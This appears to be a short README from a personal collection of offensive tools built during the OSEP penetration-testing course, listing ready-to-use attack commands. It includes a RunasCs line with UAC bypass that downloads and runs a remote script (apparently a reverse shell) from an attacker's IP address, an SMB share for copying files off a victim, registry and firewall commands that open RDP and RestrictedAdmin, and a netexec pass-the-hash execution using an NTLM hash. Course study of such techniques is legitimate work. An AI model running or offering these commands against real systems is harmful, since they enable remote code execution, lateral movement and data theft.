Just a bunch of tools built/gathered along the OSEP course.

## <ins>Useful Commands</ins>:

Run command as another user:
- `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`

Set up SMB server (file transfer):
- `smbserver.py share $(pwd) -smb2support -username amit -password password`
- On Victim: `net use \\192.168.45.223\share /U:amit password`
- Copy files: `copy <FILENAME> \\192.168.45.223\share`

Enable RDP and RestrictedAdmin from both Local/Remote:

Using command prompt: 
- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f && reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0 && netsh firewall set service remoteadmin enable && netsh firewall set service remotedesktop enable` 

Using netexec:
- `netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-auth -X 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f;reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0;netsh firewall set service remoteadmin enable;netsh firewall set service remotedesktop enable' --exec-method atexec`
